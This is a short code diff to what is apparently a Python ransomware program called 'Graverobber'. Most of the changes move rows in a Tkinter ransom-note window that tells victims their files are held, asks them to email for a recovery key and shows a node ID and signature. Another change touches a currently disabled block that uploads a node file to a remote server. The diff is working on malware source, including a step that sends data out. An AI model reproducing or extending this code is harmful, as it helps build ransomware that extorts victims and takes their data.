@@ -127,6 +127,7 @@ if False: # Disabled.
     try:
         progress = open("node_{0}.txt".format(node_id), "rb")
         progress_response = requests.post(post_server, files = {"fileToUpload": progress})
+        progress.close()
     except Exception as error:
         print(error)
     # Send files
@@ -206,23 +207,23 @@ phrase_a = Label(window, text="You have been visited by the Graverobber. Some of
 phrase_a.grid(column=0, row=0)
 
 phrase_b = Label(window, text="Get in touch with us to get your recovery key.")
-phrase_b.grid(column=0, row=2)
+phrase_b.grid(column=0, row=1)
 
 phrase_c = Label(window, text="Send a message to our@email.com")
-phrase_c.grid(column=0, row=3)
+phrase_c.grid(column=0, row=2)
 
 phrase_d = Label(window, text="Node ID: {0}".format(node_id))
-phrase_d.grid(column=0, row=4)
+phrase_d.grid(column=0, row=3)
 
 phrase_e = Label(window, text="Node Signature: {0}".format(node_sig))
-phrase_e.grid(column=0, row=5)
+phrase_e.grid(column=0, row=4)
 
 entry_field = Entry(window, width=30)
-entry_field.grid(column=0, row=6)
+entry_field.grid(column=0, row=5)
 tool.password_field = entry_field.get()
 
 button = Button(window, text="Recover", command=interlude)
-button.grid(column=0, row=7)
+button.grid(column=0, row=6)
 
 # ========================================================================= #
 # Loop:
